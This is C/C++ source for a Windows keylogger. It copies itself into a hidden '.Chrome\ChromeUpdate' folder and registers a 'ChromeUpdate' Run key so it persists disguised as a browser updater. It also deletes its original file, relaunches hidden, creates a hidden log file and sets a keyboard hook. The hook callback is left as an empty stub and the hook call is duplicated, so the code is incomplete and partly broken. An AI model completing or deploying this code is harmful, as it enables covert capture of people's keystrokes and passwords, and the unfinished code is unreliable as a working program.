
#include <stdio.h>
#include <string.h>
#include <strsafe.h>
#include <Windows.h>
#include <Shlobj_core.h>
#include <iostream>
#include <fstream>

using namespace std;

#define BUFFER_SIZE 1024
#define LOG_FILE L"keyboard.log"

HHOOK keyboardHook;
HANDLE  hFile;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void install();
void hook();

int main(int argc, char** argv) {

	if (argc == 1)
	{
		install();
		return 0;
	}

	Sleep(10000);
	DeleteFileA(argv[1]);

	hFile = CreateFile(LOG_FILE,                // name of the write
		GENERIC_WRITE| GENERIC_READ,          // open for writing
		FILE_SHARE_READ,                      
		NULL,                   // default security
		CREATE_ALWAYS,             // create new file, always; if exists and is writable, overwrites the file
		FILE_ATTRIBUTE_HIDDEN,  // hidden file
		NULL);                  // no attr. template

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Cant create file log\n");
		return 1;
	}
	hook();


	CloseHandle(hFile);
	return 0;

}
//persistence
void install() {
	wchar_t currentPath[BUFFER_SIZE];
	wchar_t destPath[BUFFER_SIZE];
	PWSTR homeDir;

	//get full file path
	if (!GetModuleFileName(NULL, currentPath, BUFFER_SIZE)) {

		printf("Cant get current file path\n");
		return;

	}

	if (wcsstr(currentPath, L"\\.Chrome\\ChromeUpdate\\keylogger.exe")) {

		return;

	}

	//Retrieves the full path of a known folder identified by the folder's KNOWNFOLDERID.
	//FOLDERID_Profile default path: %USERPROFILE% (%SystemDrive%\Users\%USERNAME%)  (https://docs.microsoft.com/en-us/windows/win32/shell/knownfolderid)
	if (SHGetKnownFolderPath(FOLDERID_Profile, 0, NULL, &homeDir) != S_OK) {

		printf("SHGetKnownFolderPath failed");
		return;

	}

	StringCchPrintf(destPath, BUFFER_SIZE, L"%s\\.Chrome\\ChromeUpdate", homeDir);

	//create dir
	SHCreateDirectoryEx(NULL, destPath, NULL);
	StringCbCat(destPath, BUFFER_SIZE, L"\\keylogger.exe\0");


	//move to hide (replace if already exits and make a copy if cant move)
	if (!CopyFile(currentPath, destPath, FALSE)) {

		printf("Cant move file\n");
		return;
	}

	HKEY hRunKey = NULL;

	//persistence
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0, KEY_SET_VALUE, &hRunKey) != ERROR_SUCCESS) { //KEY_SET_VALUE: Required to create, delete, or set a registry value.

		printf("Cant open registry key\n");
		return;
	}

	wchar_t cmd[1024];
	StringCchPrintf(cmd, BUFFER_SIZE, L"%s %s", destPath, currentPath);

	if (RegSetValueEx(hRunKey, L"ChromeUpdate ", 0, REG_SZ, (CONST BYTE*)cmd, sizeof(wchar_t) * wcslen(cmd)) != ERROR_SUCCESS) {

		printf("Cant set value under registry key\n");
		return;
	}
	RegCloseKey(hRunKey);

	STARTUPINFO startupInfo;
	PROCESS_INFORMATION procInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&procInfo, sizeof(procInfo));


	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.cb = sizeof(startupInfo);


	if (!CreateProcessW(NULL, (LPWSTR)cmd,
		NULL, NULL, TRUE, 0,
		NULL, NULL,
		&startupInfo, &procInfo)) {

		printf("Cant create process\n");
		return;
	}
}

void hook() {

	//keyboard handle
	keyboardHook = SetWindowsHookExA(WH_KEYBOARD, (HOOKPROC)LowLevelKeyboardProc, (HINSTANCE)NULL, NULL);
	if (!(keyboardHook = SetWindowsHookExA(WH_KEYBOARD, (HOOKPROC)LowLevelKeyboardProc, (HINSTANCE)NULL, NULL)) {

		printf("Set window hook failed\n");
		return;

	}
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(keyboardHook);
	//close handle file


}
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	//callNextHookEx
	//wParam case = KEY_DOWN -> log to file

}